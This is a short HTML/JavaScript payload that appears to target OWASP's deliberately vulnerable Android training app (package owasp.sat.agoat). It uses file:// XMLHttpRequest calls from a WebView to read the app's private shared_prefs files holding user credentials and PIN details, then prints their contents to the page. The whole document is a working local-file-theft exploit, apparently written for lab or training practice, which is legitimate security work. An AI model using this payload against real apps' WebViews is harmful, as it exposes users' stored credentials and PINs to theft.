<script>
var targets = [
  "file:///data/data/owasp.sat.agoat/shared_prefs/users.xml",
  "file:///data/data/owasp.sat.agoat/shared_prefs/pinDetails.xml"
];
var out = document.getElementById("out");
targets.forEach(function (u) {
  try {
    var x = new XMLHttpRequest();
    x.open("GET", u, false);
    x.send();
    out.textContent += "[READ] " + u + "\n" + x.responseText + "\n\n";
  } catch (e) {
    out.textContent += "[FAIL] " + u + "  " + e + "\n\n";
  }
});
</script>
